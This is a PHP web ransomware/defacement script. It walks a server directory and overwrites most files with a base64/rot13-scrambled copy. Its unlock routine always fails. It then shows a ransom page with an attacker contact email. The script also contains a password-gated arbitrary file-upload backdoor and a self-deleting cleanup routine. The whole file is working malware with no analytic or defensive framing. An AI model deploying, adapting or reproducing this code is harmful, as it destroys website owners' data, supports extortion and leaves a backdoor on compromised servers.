<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');

class encrxption
{
    public function generate_enc($leak){
        for ($i=1; $i <3; $i++) { 
            $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
            $leak = base64_encode(str_rot13($leak));
            $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
        }
            $pesan  = base64_decode("VGhpcyBzaXRlIGhhcyBiZWVuIGxvY2tlZCAoPiwgPCkgd2VlZWtrIC4uLiwgcGxlYXNlIGNvbnRhY3QgdG8gZW1haWwgc2hvcjdjdXRAbG9jYWxob3N0IHRvIHVubG9jayB0aGlzIHNpdGUgYmFjay4=");
            $leak   = "$leak : Locked by xS1lenc3d";
        return $leak;
    }
    public function generate_dec($leak){
        $woh = "/<!--#LOCK#(.*?)-->/";
        preg_match($woh, $leak, $matches);
        if($matches[1]){
            $leak = $matches[1];
            for ($i=1; $i <3; $i++) {
                $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
                $leak = str_rot13(base64_decode($leak));
                $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
            }
        }else{
            return false;
        }
            return $leak;
    }
    public function lock($location_file){
        $fgt    = file_get_contents($location_file); 
        $lock   = encrxption::generate_enc($fgt);
        if(encrxption::w00t($lock,$location_file)){
            echo "root@shor7cut:~ <font color='white'>{$location_file}</font> <font color='#FF03F5'>Locked Done!!!</font><br>";
        }else{
            echo "root@shor7cut:~ <font color='white'>{$location_file}</font> <font color='red'>Locked Fail!!!</font><br>";
        }
    }
    public function unlock($location_file){
        echo "root@shor7cut:~ <font color='white'>{$location_file}</font> <font color='#FF03F5'>Unlocked Fail, Bad Key.</font><br>";
    }
     
     public function w00t($data,$locate){
        if( file_put_contents($locate, htmlentities($data) ) ){
               return true;
            }else{
               return false;
        }
     }
     public function cuk($ext,$name){
        $re = "/({$name})/";  
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
    public function boom($dir,$mode)
    {
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $d = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($d)){
                    if(encrxption::cuk($d,".png") && encrxption::cuk($d,".svg") && encrxption::cuk($d,".woff") && encrxption::cuk($d,".jpg") && encrxption::cuk($d,".htaccess") && encrxption::cuk($d,"lol.php")  ){
                    
                    if($mode == "1"){
                        $locaked = encrxption::lock($d);
                    }else{
                        $unlock = encrxption::unlock($d);
                    }
                    }
                }else{
                    encrxption::boom($d,$mode);
                }
            }
        flush();
        ob_flush();
        }
    }
    public function locate(){
        return getcwd();
    }
    public function savemode(){
        $remove = unlink(basename($_SERVER['PHP_SELF']));
        if($remove){
            return true;
        }else{
            return false;
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Encrxption</title>
    <link href="https://fonts.googleapis.com/css?family=Orbitron" rel='stylesheet' type='text/css'>
<style type="text/css">
    body{
            color: #3EF403;
            background-color: black;
    }
    input {
            border: dashed 1px;
            border-color: #333;
            background-color: Black;
            font: 8pt Verdana;
            color: #0CFF37;
    }
 
    select {
        border: dashed 1px;
        border-color: #333;
        background-color: Black;
        font: 8pt Verdana;
        color: #0CFF37;
    }
    
    .text{
    font-family:Orbitron;
    color: white;
    text-align:center;
    }

</style>
</head>
<body>
<pre style="text-align: center"><font color="#00e600">


███████╗███╗   ██╗ ██████╗██████╗ ██╗  ██╗██████╗ ████████╗███████╗██████╗     ██████╗ ██╗   ██╗    ██╗  ██╗███████╗ ██╗██╗     ███████╗███╗   ██╗ ██████╗██████╗ ██████╗ 
██╔════╝████╗  ██║██╔════╝██╔══██╗╚██╗██╔╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ╚██╗██╔╝██╔════╝███║██║     ██╔════╝████╗  ██║██╔════╝╚════██╗██╔══██╗
█████╗  ██╔██╗ ██║██║     ██████╔╝ ╚███╔╝ ██████╔╝   ██║   █████╗  ██████╔╝    ██████╔╝ ╚████╔╝      ╚███╔╝ ███████╗╚██║██║     █████╗  ██╔██╗ ██║██║      █████╔╝██║  ██║
██╔══╝  ██║╚██╗██║██║     ██╔══██╗ ██╔██╗ ██╔═══╝    ██║   ██╔══╝  ██╔══██╗    ██╔══██╗  ╚██╔╝       ██╔██╗ ╚════██║ ██║██║     ██╔══╝  ██║╚██╗██║██║      ╚═══██╗██║  ██║
███████╗██║ ╚████║╚██████╗██║  ██║██╔╝ ██╗██║        ██║   ███████╗██║  ██║    ██████╔╝   ██║       ██╔╝ ██╗███████║ ██║███████╗███████╗██║ ╚████║╚██████╗██████╔╝██████╔╝
╚══════╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═════╝    ╚═╝       ╚═╝  ╚═╝╚══════╝ ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═════╝╚═════╝ ╚═════╝ 
                                                                                                                                                                          


</font> 
</pre>
<center>
<img src='http://www.angelfire.com/super/badwebs/3-AsciiGuy-Matrix.gif'/>
<div class="text">
<p>All Your files have been encrypted</p>
<p>If you want to recover all, contact me at :</p>
<p>[+] <font color="#00e600">silencedd@protonmail.com</font> [+]</p>
</div>

<a href="https://twitter.com/xslncd?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-show-count="false">Follow @xslncd</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</br>
</br>
<?php 
if($_GET['pwd']=="shor7cut"){
echo '
<form method=POST enctype="multipart/form-data" action="">
<input type="file" name="files" class="upload"> <input type=submit value="Upload"></form>';
    $files = @$_FILES["files"];
    if ($files["name"] != '') {
        $fullpath = $files["name"];
        if (move_uploaded_file($files['tmp_name'], $fullpath)) {
            echo '<font color="green">Encrypted..</font>';
        }else{
            echo '<font color="red">Ouch..</font>';
        }
    }
}else{?>
<form action="" method="post">
<input type="text" name="url" placeholder="<?= encrxption::locate(); ?>" value="<?= encrxption::locate(); ?>">
<select name="method">
        <option value="1">Encrypt</option>
</select>
<input type="submit" name="submit" value="Accept"/>
</form>
<pre style="text-align: left;"><?php
 if(isset($_POST['submit'])){
    echo encrxption::boom($_POST['url'],$_POST['method']);
    if($_POST['savemode']=="1"){
        if(encrxption::savemode()){
        echo "Encryption done.";
        }
    }
}
?>
<?php
}
?>
</pre>
</center>
</body>
</html>